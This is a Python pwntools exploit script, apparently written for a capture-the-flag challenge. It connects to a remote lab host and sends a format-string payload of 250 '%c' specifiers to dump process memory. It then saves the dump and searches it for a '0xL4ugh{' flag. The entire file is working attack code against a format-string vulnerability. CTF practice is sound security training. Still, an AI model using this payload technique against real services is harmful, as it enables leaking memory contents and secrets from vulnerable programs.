#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'

r = remote("pwn-zoroblindpath.hackena-labs.com", 443, ssl=True)

r.recvuntil(b"Clue: ")
leak = r.recvline().strip()
log.info(f"Leak: {leak}")

r.recvuntil(b"Write your path:")

# Dump as many bytes as possible
# Using 250 %c to try to get environment/argv area
payload = b"[START]" + b"%c" * 250 + b"[END]"
r.sendline(payload)

response = r.recvall(timeout=3)

log.info(f"Total response: {len(response)} bytes")

# Save dump
with open('memdump.bin', 'wb') as f:
    f.write(response)

# Look for flag patterns
if b"0xL4ugh{" in response:
    idx = response.find(b"0xL4ugh{")
    end_idx = response.find(b"}", idx)
    if end_idx != -1:
        flag = response[idx:end_idx+1]
        log.success(f"\n\n*** FLAG: {flag.decode()} ***\n\n")
    else:
        log.info(f"Found start at {idx}: {response[idx:idx+50]}")
else:
    log.info("Flag not found in dump, printing hex:")
    print(hexdump(response[:500]))

r.close()
